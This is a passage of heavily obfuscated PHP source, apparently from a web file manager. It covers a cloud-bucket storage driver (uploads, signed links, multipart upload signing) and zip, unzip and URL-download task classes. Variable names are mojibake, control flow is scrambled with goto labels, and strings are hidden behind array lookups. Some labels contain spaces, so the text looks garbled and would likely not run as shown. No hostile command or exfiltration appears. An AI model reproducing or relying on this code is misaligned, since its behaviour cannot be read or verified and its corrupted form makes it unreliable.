$dë÷°•‹¶Ú = '', $ešéñ©’Êß = false) { goto E…Ğô›è‰Ò; dñ×ò¢ÂÚ·: $Dˆ²áÊ´É = $this->client->putObject($dë÷°•‹¶Ú, $this->bucket, $dŒ—ÙÇõ©Í, $Aí¤ßæä”Ş[182], array(), $DËÌ¡Îˆš); if (!$Dˆ²áÊ´É) { return !1; } if ($ešéñ©’Êß) { return !0; } goto A¼ĞÜîÁÕí; E…Ğô›è‰Ò: $Aí¤ßæä”Ş =& $_SERVER[İë¬“ÅÒÛ›]; $dŒ—ÙÇõ©Í = $ešéñ©’Êß ? trim($dŒ—ÙÇõ©Í, $Aí¤ßæä”Ş[8]) . $Aí¤ßæä”Ş[8] : $dŒ—ÙÇõ©Í; $DËÌ¡Îˆš = get_file_mime(get_path_ext($dŒ—ÙÇõ©Í)); goto dñ×ò¢ÂÚ·; A¼ĞÜîÁÕí: $Dˆ²áÊ´É = $this->copyFile($dŒ—ÙÇõ©Í, $dŒ—ÙÇõ©Í, array($Aí¤ßæä”Ş[196] => $Dˆ²áÊ´É[$Aí¤ßæä”Ş[197]])); return $Dˆ²áÊ´É ? !0 : !1; goto DóÄàå›Ø×; DóÄàå›Ø×: } public function fileSubstr($f•´õ²÷É, $eÕ¶ˆÙâ”Œ, $C»™˜˜Äñ) { $EèßéˆÌ = $eÕ¶ˆÙâ”Œ + $C»™˜˜Äñ - 1; return $this->client->getObject($this->bucket, $f•´õ²÷É, array($_SERVER[İë¬“ÅÒÛ›][198] => "\142\x79\164\145\x73\75{$eÕ¶ˆÙâ”Œ}\55{$EèßéˆÌ}")); } public function upload($B¿Ë¬˜ì², $B•Ù‡ğÛ‘±, $f×¾…£â· = false, $cÁõÏ”ìä = REPEAT_REPLACE) { $c¢Ğò¡§¼ì =& $_SERVER[İë¬“ÅÒÛ›]; $dôĞ£¯µŸ = array($c¢Ğò¡§¼ì[196] => @md5_file($B•Ù‡ğÛ‘±)); $cµ¹ôœ†± = array($c¢Ğò¡§¼ì[199] => get_file_mime(get_path_ext($B¿Ë¬˜ì²))); if (IO::size($B•Ù‡ğÛ‘±) <= 1024 * 1024 * 200) { $C«µØİ÷íê = $this->client->putObjectFile($B•Ù‡ğÛ‘±, $this->bucket, $B¿Ë¬˜ì², $c¢Ğò¡§¼ì[182], $dôĞ£¯µŸ, $cµ¹ôœ†±); return !empty($C«µØİ÷íê) ? $this->getPathOuter($B¿Ë¬˜ì²) : !1; } $dÍµÕÓ‰ªï = $this->client->multiUploadObject($B•Ù‡ğÛ‘±, $this->bucket, trim($B¿Ë¬˜ì², $c¢Ğò¡§¼ì[8]), $dôĞ£¯µŸ, $cµ¹ôœ†±); return $dÍµÕÓ‰ªï ? $this->getPathOuter($B¿Ë¬˜ì²) : !1; } public function download($EäÖ¬‹Óå“, $d—õ‚¡¥ã‰) { if (!@is_dir($this->pathFather($d—õ‚¡¥ã‰)) && !IO::mkdir($this->pathFather($d—õ‚¡¥ã‰))) { return !1; } $a‘ª±Î†‚Ø = $this->client->getObject($this->bucket, $EäÖ¬‹Óå“, array(), $d—õ‚¡¥ã‰); return $a‘ª±Î†‚Ø !== !1 ? $d—õ‚¡¥ã‰ : !1; } public function link($b‡šˆ¦“õå, $cÊŒà±«Âé = array()) { $a§ÌãÈËÄ… =& $_SERVER[İë¬“ÅÒÛ›]; if ($this->signVer == $a§ÌãÈËÄ…[200]) { return $this->client->getAuthenticatedURL($this->bucket, $b‡šˆ¦“õå, 3600 * 12, $cÊŒà±«Âé); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($b‡šˆ¦“õå, $a§ÌãÈËÄ…[8]), 3600 * 12, $this->region, array(), !0, $cÊŒà±«Âé); } public function fileOut($eÙŸÌù‚ã, $Eâ‰‡âŒï = false, $B©Ğ´›…Ò« = false, $DÇÇé‰õÆù = '') { goto B±ïö— ‚Ò; cƒ”İø†Üƒ: if ($cßÆäçÀà³ == $D¿«•‘ÕÍš[201]) { return parent::fileOut($eÙŸÌù‚ã, $Eâ‰‡âŒï, $B©Ğ´›…Ò«, $DÇÇé‰õÆù); } $Eâ‰‡âŒï = $Eâ‰‡âŒï ? $D¿«•‘ÕÍš[202] : $D¿«•‘ÕÍš[203]; $aÁ×õç‹ë = array($D¿«•‘ÕÍš[204] => $Eâ‰‡âŒï . $D¿«•‘ÕÍš[205] . rawurlencode($B©Ğ´›…Ò«), $D¿«•‘ÕÍš[206] => $cßÆäçÀà³); goto c…È»”¬«ë; c…È»”¬«ë: $dğ­±ì¯‚í = $this->link($eÙŸÌù‚ã, $aÁ×õç‹ë); $this->fileOutLink($dğ­±ì¯‚í); goto D˜³åÌó‰‰; B±ïö— ‚Ò: $D¿«•‘ÕÍš =& $_SERVER[İë¬“ÅÒÛ›]; if (!$B©Ğ´›…Ò«) { $B©Ğ´›…Ò« = $this->pathThis($eÙŸÌù‚ã); } $cßÆäçÀà³ = get_file_mime(get_path_ext($B©Ğ´›…Ò«)); goto cƒ”İø†Üƒ; D˜³åÌó‰‰: } public function fileOutServer($bŠÄ†‡ãÔ, $F¯ÅôÑÖŸ¼ = false, $b›¸²³ÀÅ° = false, $F˜†¡±óã = '') { parent::fileOut($bŠÄ†‡ãÔ, $F¯ÅôÑÖŸ¼, $b›¸²³ÀÅ°, $F˜†¡±óã); } public function fileOutImage($cÙõÊÌÂ¥é, $D‡¥ÜôùÅ± = 250) { $c÷²éÖÉ£¹ = $this->link($cÙõÊÌÂ¥é); $this->fileOutLink($c÷²éÖÉ£¹); } public function fileOutImageServer($bÜÑÅÌ®, $d£“‚Úñà® = 250) { parent::fileOutImage($bÜÑÅÌ®, $d£“‚Úñà®); } public function hashMd5($c ÏÊƒÊŒ„, $Aº«“‡Úà© = '') { $Fóâ©ÂöÚ¥ =& $_SERVER[İë¬“ÅÒÛ›]; $bŸÜà›î›¡ = $this->getObjectInfo($c ÏÊƒÊŒ„); if (!$bŸÜà›î›¡) { return !1; } if (!isset($bŸÜà›î›¡[$Fóâ©ÂöÚ¥[207]]) && !empty($Aº«“‡Úà©)) { $AéåáÒáŠ‡ = $this->copyFile($c ÏÊƒÊŒ„, $c ÏÊƒÊŒ„, array($Fóâ©ÂöÚ¥[196] => $Aº«“‡Úà©)); $bŸÜà›î›¡[$Fóâ©ÂöÚ¥[207]] = $AéåáÒáŠ‡ ? $Aº«“‡Úà© : $Fóâ©ÂöÚ¥[33]; } return isset($bŸÜà›î›¡[$Fóâ©ÂöÚ¥[207]]) ? $bŸÜà›î›¡[$Fóâ©ÂöÚ¥[207]] : $Fóâ©ÂöÚ¥[33]; } public function fileInfoImage($A”ìÜİùÙ, &$fàï˜ğÒµ³) { $C—Ï•í•¾ =& $_SERVER[İë¬“ÅÒÛ›]; $B†•±‚©š¤ = array($C—Ï•í•¾[208], $C—Ï•í•¾[158], $C—Ï•í•¾[209], $C—Ï•í•¾[210], $C—Ï•í•¾[211]); if (in_array($fàï˜ğÒµ³[$C—Ï•í•¾[157]], $B†•±‚©š¤)) { $eºù…¡í›ñ = $this->link($A”ìÜİùÙ); $d•Ñ×œÚÉ = getimagesize($eºù…¡í›ñ); if ($d•Ñ×œÚÉ) { $fàï˜ğÒµ³[$C—Ï•í•¾[212]] = array($C—Ï•í•¾[213] => $d•Ñ×œÚÉ[0], $C—Ï•í•¾[214] => $d•Ñ×œÚÉ[1]); } } } public function _getObjectInfo($Eó²¯Ãœ‹) { return $this->client->getObjectInfo($this->bucket, $Eó²¯Ãœ‹); } public function uploadFormData($Cš¢Š“å‡ , $cššö„µ™— = 3600) { $Dƒœ©¯œğƒ =& $_SERVER[İë¬“ÅÒÛ›]; $Cà«âˆÙƒá = $this->pathFather($Cš¢Š“å‡ ); $aˆå¢»ùë“ = $this->client->getHttpUploadPostParams($this->bucket, $Cà«âˆÙƒá, $Dƒœ©¯œğƒ[182], $cššö„µ™—); return array_merge((array) $aˆå¢»ùë“, array($Dƒœ©¯œğƒ[166] => $this->getHost())); } public function multiUploadFormData($CœÃé½¯‡™, $Aå²Ï±²½ğ = 3600) { $AàäœßÌÛ‚ =& $_SERVER[İë¬“ÅÒÛ›]; $fèˆÂ›¹¹ = gmdate($AàäœßÌÛ‚[215]); $f«”°„Œ¨Ô = array(); $AôÀŠÕÃ¦ = $this->client->getUploadId($this->bucket, $CœÃé½¯‡™, $f«”°„Œ¨Ô); if (!$AôÀŠÕÃ¦) { return !1; } return array($AàäœßÌÛ‚[216] => $AôÀŠÕÃ¦, $AàäœßÌÛ‚[166] => $this->getHost() . $AàäœßÌÛ‚[8] . $this->pathEncode($CœÃé½¯‡™), $AàäœßÌÛ‚[217] => $fèˆÂ›¹¹, $AàäœßÌÛ‚[88] => $CœÃé½¯‡™); } public function multiUploadAuthData($B×£„ùï, $dÆÛ¨Šôù = array()) { goto eÀ±¼ ˜È²; eïß•Š²ïô: if (isset($dÆÛ¨Šôù[$F‡¬”™«ö[222]]) && $dÆÛ¨Šôù[$F‡¬”™«ö[222]] == $F‡¬”™«ö[223]) { $bÇÆîĞİïå[0] = $F‡¬”™«ö[223]; } $cŞ„ÂêÀñÁ = implode($F‡¬”™«ö[224], $bÇÆîĞİïå); $CÕº¹ÖÄ  = base64_encode(hash_hmac($F‡¬”™«ö[225], $cŞ„ÂêÀñÁ, $this->secret, !0)); goto AÑÓßôß¡Æ; B‹ëï„©: $AæŠˆ‚‚ì = isset($dÆÛ¨Šôù[$F‡¬”™«ö[157]]) ? $dÆÛ¨Šôù[$F‡¬”™«ö[157]] : $F‡¬”™«ö[33]; $EõßÖÈØ = $dÆÛ¨Šôù[$F‡¬”™«ö[88]]; unset($dÆÛ¨Šôù[$F‡¬”™«ö[88]]); goto AœÊ‘¨Ì; AœÊ‘¨Ì: if (isset($dÆÛ¨Šôù[$F‡¬”™«ö[218]])) { return $this->listUploadParts($EõßÖÈØ, $dÆÛ¨Šôù); } $bÇÆîĞİïå = array($F‡¬”™«ö[219], $F‡¬”™«ö[33], $F‡¬”™«ö[115], $F‡¬”™«ö[33], "\x78\55\x61\x6d\172\55\x64\x61\164\145\72{$E“¢ÉÉîğ}", $F‡¬”™«ö[8] . $this->bucket . $F‡¬”™«ö[8] . $this->pathEncode($EõßÖÈØ) . $AæŠˆ‚‚ì); if (strpos($AæŠˆ‚‚ì, $F‡¬”™«ö[220]) === 0) { $bÇÆîĞİïå[0] = $F‡¬”™«ö[221]; } goto eïß•Š²ïô; AÑÓßôß¡Æ: $A‘™ÏÂ«¦… = $F‡¬”™«ö[226] . $this->accessKey . $F‡¬”™«ö[4] . $CÕº¹ÖÄ ; if (strpos($AæŠˆ‚‚ì, $F‡¬”™«ö[220]) === 0) { return array($F‡¬”™«ö[227] => $A‘™ÏÂ«¦…, $F‡¬”™«ö[217] => $E“¢ÉÉîğ); } return $A‘™ÏÂ«¦…; goto f‚¤«Ë¾; eÀ±¼ ˜È²: $F‡¬”™«ö =& $_SERVER[İë¬“ÅÒÛ›]; $E“¢ÉÉîğ = isset($dÆÛ¨Šôù[$F‡¬”™«ö[217]]) ? $dÆÛ¨Šôù[$F‡¬”™«ö[217]] : gmdate($F‡¬”™«ö[215]); $dÆÛ¨Šôù[$F‡¬”™«ö[217]] = $E“¢ÉÉîğ; goto B‹ëï„©; f‚¤«Ë¾: } public function listUploadParts($Còµõİ¯†¿, $eÄè•õŞ‡ = array()) { goto b³Œ¸‰£„–; b³Œ¸‰£„–: $eêÔøÊÀÑ =& $_SERVER[İë¬“ÅÒÛ›]; $BÍµ‹‚ÕÄ‘ = str_replace($eêÔøÊÀÑ[228], $eêÔøÊÀÑ[33], $eÄè•õŞ‡[$eêÔøÊÀÑ[157]]); $fØõèÇÀê = $this->client->listParts($this->bucket, $Còµõİ¯†¿, $BÍµ‹‚ÕÄ‘); goto B‡¡‡ĞÂ¹Ï; a¾Š‚×ˆŸÖ: $BáäŸŒ˜‰Ö = $this->multiUploadAuthData($Còµõİ¯†¿, $eÄè•õŞ‡); if (empty($BáäŸŒ˜‰Ö)) { return !1; } return array($eêÔøÊÀÑ[227] => $BáäŸŒ˜‰Ö, $eêÔøÊÀÑ[217] => $eÄè•õŞ‡[$eêÔøÊÀÑ[217]], $eêÔøÊÀÑ[229] => $fØõèÇÀê); goto b¸ÜäÂ©ö; B‡¡‡ĞÂ¹Ï: if (!$fØõèÇÀê) { return !1; } unset($eÄè•õŞ‡[$eêÔøÊÀÑ[218]], $eÄè•õŞ‡[$eêÔøÊÀÑ[222]]); $eÄè•õŞ‡[$eêÔøÊÀÑ[88]] = $Còµõİ¯†¿; goto a¾Š‚×ˆŸÖ; b¸ÜäÂ©ö: } public function getHost() { return parent::getHost() . $_SERVER[İë¬“ÅÒÛ›][8] . $this->bucket; } } goto fé‡¡³Øêñ; e«ß¼Ñ­Á„: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto c–ñ–ö¬Öæ; c–ñ–ö¬Öæ: $fèœ‡ˆÍŒƒ =& $_SERVER[İë¬“ÅÒÛ›]; parent::startAfter(); Hook::bind($fèœ‡ˆÍŒƒ[1152], array($this, $fèœ‡ˆÍŒƒ[1153])); goto BÕ“èÔŠĞ; Bœ½†í«: if (!$B××õ¯äè[$fèœ‡ˆÍŒƒ[1004]]) { $B××õ¯äè[$fèœ‡ˆÍŒƒ[1004]] = LNG($fèœ‡ˆÍŒƒ[1156]); } goto cÜ‘»õÄ©Ä; BÕ“èÔŠĞ: Hook::bind($fèœ‡ˆÍŒƒ[787], array($this, $fèœ‡ˆÍŒƒ[1154])); $B××õ¯äè =& $this->task; $B××õ¯äè[$fèœ‡ˆÍŒƒ[1155]] = $fèœ‡ˆÍŒƒ[792]; goto Bœ½†í«; cÜ‘»õÄ©Ä: } protected function endAfter() { $B¡éĞ¾Ş°¥ =& $_SERVER[İë¬“ÅÒÛ›]; parent::endAfter(); Hook::unbind($B¡éĞ¾Ş°¥[1152], array($this, $B¡éĞ¾Ş°¥[1153])); Hook::unbind($B¡éĞ¾Ş°¥[787], array($this, $B¡éĞ¾Ş°¥[1154])); } public function updateAfter() { $A™³¦Ÿ°é =& $_SERVER[İë¬“ÅÒÛ›]; $f³§…• ¦¥ =& $this->task; if (!$f³§…• ¦¥[$A™³¦Ÿ°é[1097]] || !$f³§…• ¦¥[$A™³¦Ÿ°é[456]]) { return; } if ($f³§…• ¦¥[$A™³¦Ÿ°é[1155]] == $A™³¦Ÿ°é[792]) { $e´Ö¿àö©© = 0; if ($f³§…• ¦¥[$A™³¦Ÿ°é[1135]]) { $e´Ö¿àö©© = $f³§…• ¦¥[$A™³¦Ÿ°é[1136]] / $f³§…• ¦¥[$A™³¦Ÿ°é[1135]]; } $f³§…• ¦¥[$A™³¦Ÿ°é[1099]] = $e´Ö¿àö©© * 0.3; } else { if ($f³§…• ¦¥[$A™³¦Ÿ°é[1155]] == $A™³¦Ÿ°é[305]) { $e´Ö¿àö©© = $f³§…• ¦¥[$A™³¦Ÿ°é[1098]] / $f³§…• ¦¥[$A™³¦Ÿ°é[1097]]; $f³§…• ¦¥[$A™³¦Ÿ°é[1099]] = 0.3 + $e´Ö¿àö©© * 0.4; } else { if ($f³§…• ¦¥[$A™³¦Ÿ°é[1155]] == $A™³¦Ÿ°é[90]) { $eç«¾Ì¾ = 0; if ($f³§…• ¦¥[$A™³¦Ÿ°é[1137]] == $A™³¦Ÿ°é[90]) { $eç«¾Ì¾ = $f³§…• ¦¥[$A™³¦Ÿ°é[1136]]; } $e´Ö¿àö©© = ($f³§…• ¦¥[$A™³¦Ÿ°é[1140]] + $eç«¾Ì¾) / $f³§…• ¦¥[$A™³¦Ÿ°é[456]]; $f³§…• ¦¥[$A™³¦Ÿ°é[1099]] = 0.3 + 0.4 + $e´Ö¿àö©© * 0.3; } } } if ($f³§…• ¦¥[$A™³¦Ÿ°é[1099]] > 0) { $Dâİ‘ñÊö¹ = timeFloat() - $f³§…• ¦¥[$A™³¦Ÿ°é[1101]] - $f³§…• ¦¥[$A™³¦Ÿ°é[1104]]; $f³§…• ¦¥[$A™³¦Ÿ°é[1105]] = $Dâİ‘ñÊö¹ * (1 - $f³§…• ¦¥[$A™³¦Ÿ°é[1099]]) / $f³§…• ¦¥[$A™³¦Ÿ°é[1099]]; } } public function addFile($C²­šµ) { goto c›÷î×Ùè«; a¸ª–£’‰: $AƒÍ½‹ãéÀ[$A´¸Å§‘Œ[1133]] = $b„˜ñå‘ËÕ[$A´¸Å§‘Œ[28]]; $AƒÍ½‹ãéÀ[$A´¸Å§‘Œ[1135]] = $b„˜ñå‘ËÕ[$A´¸Å§‘Œ[78]]; $AƒÍ½‹ãéÀ[$A´¸Å§‘Œ[1136]] = 0; goto bëÖ÷æ˜Œ; bëÖ÷æ˜Œ: $AƒÍ½‹ãéÀ[$A´¸Å§‘Œ[1096]] = $A´¸Å§‘Œ[1145]; $AƒÍ½‹ãéÀ[$A´¸Å§‘Œ[1137]] = $A´¸Å§‘Œ[792]; $AƒÍ½‹ãéÀ[$A´¸Å§‘Œ[456]] = $b„˜ñå‘ËÕ[$A´¸Å§‘Œ[78]]; goto A¨Ø’¦îØ¿; A¨Ø’¦îØ¿: $AƒÍ½‹ãéÀ[$A´¸Å§‘Œ[1097]] = 1; $AƒÍ½‹ãéÀ[$A´¸Å§‘Œ[1141]] = array(); $AƒÍ½‹ãéÀ[$A´¸Å§‘Œ[1141]][] = array($A´¸Å§‘Œ[388] => $b„˜ñå‘ËÕ[$A´¸Å§‘Œ[28]], $A´¸Å§‘Œ[76] => $b„˜ñå‘ËÕ[$A´¸Å§‘Œ[76]], $A´¸Å§‘Œ[777] => $b„˜ñå‘ËÕ[$A´¸Å§‘Œ[777]] ? $b„˜ñå‘ËÕ[$A´¸Å§‘Œ[777]] : $b„˜ñå‘ËÕ[$A´¸Å§‘Œ[76]]); goto fíáİ–ãô¸; c›÷î×Ùè«: $A´¸Å§‘Œ =& $_SERVER[İë¬“ÅÒÛ›]; $AƒÍ½‹ãéÀ =& $this->task; $b„˜ñå‘ËÕ = IO::info($C²­šµ); goto a¸ª–£’‰; fíáİ–ãô¸: $this->update(); goto F´ê…ìˆÉË; F´ê…ìˆÉË: } public function unzipAfter($b¶Ö ‡ÑåÍ) { goto F‹ã…–±‹‰; bĞ¿íèÔŒ: $d±é×²ä™¾[$fÔçÑ˜²Ä[1098]] = 0; $d±é×²ä™¾[$fÔçÑ˜²Ä[1135]] = 0; $d±é×²ä™¾[$fÔçÑ˜²Ä[1136]] = 0; goto EÂİ¾Î°ÑÚ; bÛ†‘æî¤‡: $this->update(); self::log($fÔçÑ˜²Ä[1157] . json_encode(array($d±é×²ä™¾, $eâ¡ íÖµÀ))); goto eÀÉ²®¶ÜË; F‹ã…–±‹‰: $fÔçÑ˜²Ä =& $_SERVER[İë¬“ÅÒÛ›]; $d±é×²ä™¾ =& $this->task; $d±é×²ä™¾[$fÔçÑ˜²Ä[1155]] = $fÔçÑ˜²Ä[90]; goto Eò¥«ÖÖÜ; EÂİ¾Î°ÑÚ: $d±é×²ä™¾[$fÔçÑ˜²Ä[1133]] = $fÔçÑ˜²Ä[33]; $d±é×²ä™¾[$fÔçÑ˜²Ä[1140]] = 0; $d±é×²ä™¾[$fÔçÑ˜²Ä[456]] = $eâ¡ íÖµÀ[$fÔçÑ˜²Ä[78]]; goto bÛ†‘æî¤‡; Eò¥«ÖÖÜ: $eâ¡ íÖµÀ = IO::infoWithChildren($b¶Ö ‡ÑåÍ); $d±é×²ä™¾[$fÔçÑ˜²Ä[1141]] = array(); $d±é×²ä™¾[$fÔçÑ˜²Ä[1141]][] = array($fÔçÑ˜²Ä[388] => $eâ¡ íÖµÀ[$fÔçÑ˜²Ä[28]], $fÔçÑ˜²Ä[76] => $eâ¡ íÖµÀ[$fÔçÑ˜²Ä[76]], $fÔçÑ˜²Ä[777] => $eâ¡ íÖµÀ[$fÔçÑ˜²Ä[777]] ? $eâ¡ íÖµÀ[$fÔçÑ˜²Ä[777]] : $eâ¡ íÖµÀ[$fÔçÑ˜²Ä[76]]); goto eòİÜ³ƒÍ; eòİÜ³ƒÍ: if ($eâ¡ íÖµÀ[$fÔçÑ˜²Ä[29]] == $fÔçÑ˜²Ä[164]) { $d±é×²ä™¾[$fÔçÑ˜²Ä[1097]] = 1; } else { $d±é×²ä™¾[$fÔçÑ˜²Ä[1097]] = $eâ¡ íÖµÀ[$fÔçÑ˜²Ä[81]][$fÔçÑ˜²Ä[79]]; } $d±é×²ä™¾[$fÔçÑ˜²Ä[1096]] = $fÔçÑ˜²Ä[33]; $d±é×²ä™¾[$fÔçÑ˜²Ä[1137]] = 0; goto bĞ¿íèÔŒ; eÀÉ²®¶ÜË: } public function nameParse($F¸å¨½Ø´Â) { goto BæÒÃ†¿Çê; A’ƒâ¤ŞÁ: $F‘¡ÇÄ‡ËÙ = get_path_this($F¸å¨½Ø´Â); if (strstr($F‘¡ÇÄ‡ËÙ, $Eè ï‰ÄÔ[92])) { $fñÍ®ÙçÌŠ[$Eè ï‰ÄÔ[1098]] += 1; $fñÍ®ÙçÌŠ[$Eè ï‰ÄÔ[1097]] += 1; } $fñÍ®ÙçÌŠ[$Eè ï‰ÄÔ[1133]] = $F¸å¨½Ø´Â; goto eªÍÂ¢Àİ¥; eªÍÂ¢Àİ¥: $this->update(); goto B–ğ²à¾ÛË; BæÒÃ†¿Çê: $Eè ï‰ÄÔ =& $_SERVER[İë¬“ÅÒÛ›]; $fñÍ®ÙçÌŠ =& $this->task; if ($fñÍ®ÙçÌŠ[$Eè ï‰ÄÔ[1155]] == $Eè ï‰ÄÔ[792]) { $fñÍ®ÙçÌŠ[$Eè ï‰ÄÔ[1155]] = $Eè ï‰ÄÔ[305]; $fñÍ®ÙçÌŠ[$Eè ï‰ÄÔ[1140]] = 0; $fñÍ®ÙçÌŠ[$Eè ï‰ÄÔ[456]] = 0; } goto A’ƒâ¤ŞÁ; B–ğ²à¾ÛË: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $E±ğĞ°šì‚ =& $_SERVER[İë¬“ÅÒÛ›]; parent::startAfter(); Hook::bind($E±ğĞ°šì‚[1158], array($this, $E±ğĞ°šì‚[1153])); $bÀï­‰†ˆ =& $this->task; $bÀï­‰†ˆ[$E±ğĞ°šì‚[1155]] = $E±ğĞ°šì‚[792]; if (!$bÀï­‰†ˆ[$E±ğĞ°šì‚[1004]]) { $bÀï­‰†ˆ[$E±ğĞ°šì‚[1004]] = LNG($E±ğĞ°šì‚[1159]); } } protected function endAfter() { $b›»´¹ñÙè =& $_SERVER[İë¬“ÅÒÛ›]; parent::endAfter(); Hook::unbind($b›»´¹ñÙè[1158], array($this, $b›»´¹ñÙè[1153])); } public function updateAfter() { $c±Šñì¼‰— =& $_SERVER[İë¬“ÅÒÛ›]; $eÈ‚¿Öğ¡” =& $this->task; if (!$eÈ‚¿Öğ¡”[$c±Šñì¼‰—[1097]] || !$eÈ‚¿Öğ¡”[$c±Šñì¼‰—[456]]) { return; } if ($eÈ‚¿Öğ¡”[$c±Šñì¼‰—[1155]] == $c±Šñì¼‰—[792]) { $eß¶í‰ƒ  = $eÈ‚¿Öğ¡”[$c±Šñì¼‰—[1136]]; if ($eÈ‚¿Öğ¡”[$c±Šñì¼‰—[1137]] != $c±Šñì¼‰—[792]) { $eß¶í‰ƒ  = 0; } $cÚƒ«©ë = ($eÈ‚¿Öğ¡”[$c±Šñì¼‰—[1140]] + $eß¶í‰ƒ ) / $eÈ‚¿Öğ¡”[$c±Šñì¼‰—[456]]; $eÈ‚¿Öğ¡”[$c±Šñì¼‰—[1099]] = $cÚƒ«©ë * 0.3; } else { if ($eÈ‚¿Öğ¡”[$c±Šñì¼‰—[1155]] == $c±Šñì¼‰—[305]) { $cÚƒ«©ë = $eÈ‚¿Öğ¡”[$c±Šñì¼‰—[1098]] / $eÈ‚¿Öğ¡”[$c±Šñì¼‰—[1097]]; $eÈ‚¿Öğ¡”[$c±Šñì¼‰—[1099]] = 0.3 + $cÚƒ«©ë * 0.5; } else { if ($eÈ‚¿Öğ¡”[$c±Šñì¼‰—[1155]] == $c±Šñì¼‰—[90]) { $cÚƒ«©ë = 0; if ($eÈ‚¿Öğ¡”[$c±Šñì¼‰—[1135]]) { $cÚƒ«©ë = $eÈ‚¿Öğ¡”[$c±Šñì¼‰—[1136]] / $eÈ‚¿Öğ¡”[$c±Šñì¼‰—[1135]]; } $eÈ‚¿Öğ¡”[$c±Šñì¼‰—[1099]] = 0.3 + 0.5 + $cÚƒ«©ë * 0.2; } } } if ($eÈ‚¿Öğ¡”[$c±Šñì¼‰—[1099]] > 0) { $fä‰’ÁÊšæ = timeFloat() - $eÈ‚¿Öğ¡”[$c±Šñì¼‰—[1101]] - $eÈ‚¿Öğ¡”[$c±Šñì¼‰—[1104]]; $eÈ‚¿Öğ¡”[$c±Šñì¼‰—[1105]] = $fä‰’ÁÊšæ * (1 - $eÈ‚¿Öğ¡”[$c±Šñì¼‰—[1099]]) / $eÈ‚¿Öğ¡”[$c±Šñì¼‰—[1099]]; } } public function copyFileStart($AèõˆÇã, $e…˜¡Ä‚Şè, $E­­©öõ–İ, $DÛôø×ê«İ, $E¢°Ø‹¼Ğ«, $b¬…ˆ±‘ïš) { $CµäæˆÇÒĞ =& $_SERVER[İë¬“ÅÒÛ›]; parent::copyFileStart($AèõˆÇã, $e…˜¡Ä‚Şè, $E­­©öõ–İ, $DÛôø×ê«İ, $E¢°Ø‹¼Ğ«, $b¬…ˆ±‘ïš); $EÜ•İ’ÁÉô =& $this->task; if ($EÜ•İ’ÁÉô[$CµäæˆÇÒĞ[1155]] == $CµäæˆÇÒĞ[305]) { $EÜ•İ’ÁÉô[$CµäæˆÇÒĞ[1155]] = $CµäæˆÇÒĞ[90]; } $this->update(); } public function copyFileEnd($Dó³––†ÖÙ, $BòƒÆô˜ï, $CĞåìÊÈÏ”, $f¼¼â·®ëÄ, $A†¬éŒìŒ‹, $EÌãóÅÇ¦) { $D×Õª¾Ú¦Á =& $_SERVER[İë¬“ÅÒÛ›]; $Cù¸ÉÎÓ¾Ş =& $this->task; $Cù¸ÉÎÓ¾Ş[$D×Õª¾Ú¦Á[1136]] = $Cù¸ÉÎÓ¾Ş[$D×Õª¾Ú¦Á[1135]]; $Cù¸ÉÎÓ¾Ş[$D×Õª¾Ú¦Á[1140]] += $Cù¸ÉÎÓ¾Ş[$D×Õª¾Ú¦Á[1135]]; $Cù¸ÉÎÓ¾Ş[$D×Õª¾Ú¦Á[1137]] = $D×Õª¾Ú¦Á[33]; $this->update(); } public function nameParse($DÜ×Ã•µ¸¡) { $DÀ‹æêßŒ† =& $_SERVER[İë¬“ÅÒÛ›]; $EÎÀŒ¼Î¦˜ =& $this->task; if ($EÎÀŒ¼Î¦˜[$DÀ‹æêßŒ†[1098]] < $EÎÀŒ¼Î¦˜[$DÀ‹æêßŒ†[1097]]) { $A£åê¾£± = get_path_this($DÜ×Ã•µ¸¡); if (strstr($A£åê¾£±, $DÀ‹æêßŒ†[92])) { $EÎÀŒ¼Î¦˜[$DÀ‹æêßŒ†[1098]] += 1; } } if ($EÎÀŒ¼Î¦˜[$DÀ‹æêßŒ†[1155]] == $DÀ‹æêßŒ†[792]) { $EÎÀŒ¼Î¦˜[$DÀ‹æêßŒ†[1155]] = $DÀ‹æêßŒ†[305]; } $EÎÀŒ¼Î¦˜[$DÀ‹æêßŒ†[1133]] = $DÜ×Ã•µ¸¡; $this->update(); } } class Downloader { static function start($D‰…ĞÀßÂĞ, $FÃ¾í’®®•, $e¼“°‡Çô• = 10) { goto B¬â¶ªŒùŒ; B¦ÏˆÊÒâ¬: $d©Àø—¬ğ = intval($c©¥‹÷÷[$F»¼à†ŒÜ[329]]); if (file_exists($f™ÖèÍÖÄÒ) && time() - filemtime($f™ÖèÍÖÄÒ) < 3) { return array($F»¼à†ŒÜ[784] => !1, $F»¼à†ŒÜ[786] => $F»¼à†ŒÜ[1163]); } $aå¿òøÑëÔ = array(); goto A¾×ÛôåË‰; B’ôÏŸ„: $f™ÖèÍÖÄÒ = $FÃ¾í’®®• . $F»¼à†ŒÜ[1161]; if (is_array($D‰…ĞÀßÂĞ)) { $c©¥‹÷÷ = $D‰…ĞÀßÂĞ; } else { $c©¥‹÷÷ = url_header($D‰…ĞÀßÂĞ); } $D‰…ĞÀßÂĞ = $c©¥‹÷÷[$F»¼à†ŒÜ[299]]; goto e³’é»õè»; B¬â¶ªŒùŒ: $F»¼à†ŒÜ =& $_SERVER[İë¬“ÅÒÛ›]; if (!request_url_safe($D‰…ĞÀßÂĞ)) { return array($F»¼à†ŒÜ[784] => !1, $F»¼à†ŒÜ[786] => $F»¼à†ŒÜ[789]); } $F‡ÚæÈÄù = $FÃ¾í’®®• . $F»¼à†ŒÜ[1160]; goto B’ôÏŸ„; fêãİŸŠöÆ: if ($Eù’ò £·£ > $d©Àø—¬ğ) { @unlink($f™ÖèÍÖÄÒ); } file_put_contents($F‡ÚæÈÄù, json_encode($aå¿òøÑëÔ)); $Cá¨—çŠò = self::fileDownloadCurl($D‰…ĞÀßÂĞ, $FÃ¾í’®®•, !0, $Eù’ò £·£, $d©Àø—¬ğ); goto aÑßØÍ“ó; aÑßØÍ“ó: if ($Cá¨—çŠò[$F»¼à†ŒÜ[784]]) { @unlink($F‡ÚæÈÄù); } return $Cá¨—çŠò; goto a–—‚§¢¾ª; e³’é»õè»: if (!$D‰…ĞÀßÂĞ) { return array($F»¼à†ŒÜ[784] => !1, $F»¼à†ŒÜ[786] => $F»¼à†ŒÜ[789]); } if (!$c©¥‹÷÷[$F»¼à†ŒÜ[1162]] || $c©¥‹÷÷[$F»¼à†ŒÜ[329]] == 0) { @unlink($f™ÖèÍÖÄÒ); 